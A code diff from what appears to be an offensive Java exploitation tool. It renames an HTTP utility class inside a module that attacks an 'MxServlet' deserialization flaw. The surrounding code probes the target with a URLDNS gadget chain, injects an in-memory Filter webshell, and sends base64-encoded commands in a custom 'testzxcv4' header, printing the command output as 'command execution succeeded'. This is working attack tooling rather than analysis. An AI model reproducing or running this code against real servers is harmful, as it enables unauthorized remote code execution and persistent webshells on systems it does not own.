@@ -7,7 +7,7 @@ import com.chave.config.Mod;
 import com.chave.gadget.chain.CommonsCollections6_Array;
 import com.chave.gadget.chain.URLDNS;
 import com.chave.proxy.HttpProxy;
-import com.chave.utils.HttpUtil;
+import com.chave.utils.MyHttpUtil;
 import com.chave.utils.SSLUtil;
 import com.chave.utils.Util;
 import javafx.scene.control.TextArea;
@@ -74,15 +74,15 @@ public class MxServlet_Unserialize extends VulnBase {
             HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(urldns_conn);
+            MyHttpUtil.setTimeout(urldns_conn);
 
             // 设置请求头
             urldns_conn.setRequestProperty("Content-Type", "application/octet-stream");
             urldns_conn.setRequestProperty("Content-Length", String.valueOf(postData.length));
 
-            HttpUtil.post(urldns_conn, postData);
+            MyHttpUtil.post(urldns_conn, postData);
 
-            int responseCode = HttpUtil.getResponseCode(urldns_conn);
+            int responseCode = MyHttpUtil.getResponseCode(urldns_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 logMessage("[+] MxServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
             } else {
@@ -108,15 +108,15 @@ public class MxServlet_Unserialize extends VulnBase {
             HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(urldns_conn);
+            MyHttpUtil.setTimeout(urldns_conn);
 
             // 设置请求头
             urldns_conn.setRequestProperty("Content-Type", "application/octet-stream");
             urldns_conn.setRequestProperty("Content-Length", String.valueOf(postData.length));
 
-            HttpUtil.post(urldns_conn, postData);
+            MyHttpUtil.post(urldns_conn, postData);
 
-            int responseCode = HttpUtil.getResponseCode(urldns_conn);
+            int responseCode = MyHttpUtil.getResponseCode(urldns_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 logMessage("[+] Filter 内存马注入成功! 请手动连接验证.");
                 return;
@@ -147,17 +147,17 @@ public class MxServlet_Unserialize extends VulnBase {
             HttpURLConnection exec_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(exec_conn);
+            MyHttpUtil.setTimeout(exec_conn);
 
             // 设置请求头
             exec_conn.setRequestProperty("Content-Type", "application/octet-stream");
             exec_conn.setRequestProperty("Content-Length", String.valueOf(baos.toByteArray().length));
             exec_conn.setRequestProperty("testzxcv4", flag + Util.byteCodeToBase64(Config.CMD.getBytes()));
 
-            HttpUtil.post(exec_conn, baos.toByteArray());
+            MyHttpUtil.post(exec_conn, baos.toByteArray());
 
-            int responseCode = HttpUtil.getResponseCode(exec_conn);
-            String responseText = HttpUtil.getResponseText(exec_conn);
+            int responseCode = MyHttpUtil.getResponseCode(exec_conn);
+            String responseText = MyHttpUtil.getResponseText(exec_conn);
             if (responseCode == HttpURLConnection.HTTP_OK && responseText != null && !responseText.isEmpty()) {
                 logExec("[+] 命令执行成功!\n" + responseText);
                 return;
